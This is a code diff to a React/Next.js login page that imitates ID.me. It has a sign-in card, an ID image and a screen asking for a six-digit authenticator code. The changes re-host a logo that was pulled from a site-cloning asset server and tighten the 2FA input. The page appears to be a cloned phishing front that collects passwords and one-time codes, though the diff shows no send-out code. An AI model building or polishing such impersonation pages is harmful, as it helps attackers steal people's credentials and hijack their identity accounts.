@@ -3,7 +3,7 @@
 import { useState, useEffect } from "react";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
-import { Card, CardContent, CardHeader } from "@/components/ui/card";
+import { Card, CardHeader, CardContent } from "@/components/ui/card";
 import { Checkbox } from "@/components/ui/checkbox";
 import { Eye, EyeOff, CheckCircle, AlertCircle, Loader } from "lucide-react";
 import Link from "next/link";
@@ -147,7 +147,7 @@ export default function LoginPage() {
         <div className="flex-1 flex items-center justify-center px-4 py-8">
           <div className="w-full max-w-md">
             <div className="text-center mb-8">
-              <img src="https://ext.same-assets.com/1949166237/975348835.svg" alt="ID.me" className="h-8 mx-auto" />
+              <img src="images/logo.svg" alt="ID.me" className="h-8 mx-auto" />
             </div>
             <Card className="shadow-lg border-0">
               <CardHeader className="space-y-4 pb-4">
@@ -218,7 +218,7 @@ export default function LoginPage() {
       <div className="min-h-screen bg-gray-100 flex flex-col items-center justify-center px-4 py-8">
         <div className="w-full max-w-md">
           <div className="text-center mb-8">
-            <img src="https://ext.same-assets.com/1949166237/975348835.svg" alt="ID.me" className="h-8 mx-auto" />
+            <img src="images/logo.svg" alt="ID.me" className="h-8 mx-auto" />
           </div>
           <Card className="shadow-lg border-0">
             <CardHeader className="space-y-4 pb-4">
@@ -227,7 +227,6 @@ export default function LoginPage() {
                 <img src="/images/123.png" alt="Back ID" className="w-full h-29 object-cover mb-2" />
               </div>
             </CardHeader>
-
             <CardContent className="space-y-4">
               <p className="text-2xl font-semibold text-center text-gray-900">Enter a code from your device</p>
               <p className="text-sm text-gray-600">Please check your code generator application and enter the generated 6-digit code to complete your sign in.</p>
@@ -237,7 +236,12 @@ export default function LoginPage() {
                   type="text"
                   placeholder="------"
                   value={twoFactorCode}
-                  onChange={(e) => setTwoFactorCode(e.target.value)}
+                  onChange={(e) => {
+                    const value = e.target.value.replace(/[^0-9]/g, "").slice(0, 6);
+                    setTwoFactorCode(value);
+                  }}
+                  maxLength={6}
+                  pattern="[0-9]{6}"
                   className="w-full mb-4 text-center text-2xl placeholder:text-2xl placeholder:font-semibold placeholder:text-black-400"
                   required
                 />
@@ -276,7 +280,7 @@ export default function LoginPage() {
       <div className="min-h-screen bg-gray-100 flex flex-col items-center justify-center px-4 py-8">
         <div className="w-full max-w-md">
           <div className="text-center mb-8">
-            <img src="https://ext.same-assets.com/1949166237/975348835.svg" alt="ID.me" className="h-8 mx-auto" />
+            <img src="images/logo.svg" alt="ID.me" className="h-8 mx-auto" />
           </div>
           <Card className="shadow-lg border-0">
             <CardHeader className="space-y-4 pb-4">
@@ -333,7 +337,7 @@ export default function LoginPage() {
       <div className="min-h-screen bg-gray-100 flex flex-col items-center justify-center px-4 py-8">
         <div className="w-full max-w-md">
           <div className="text-center mb-8">
-            <img src="https://ext.same-assets.com/1949166237/975348835.svg" alt="ID.me" className="h-8 mx-auto" />
+            <img src="images/logo.svg" alt="ID.me" className="h-8 mx-auto" />
           </div>
           <Card className="shadow-lg border-0">
             <CardHeader className="space-y-4 pb-4">
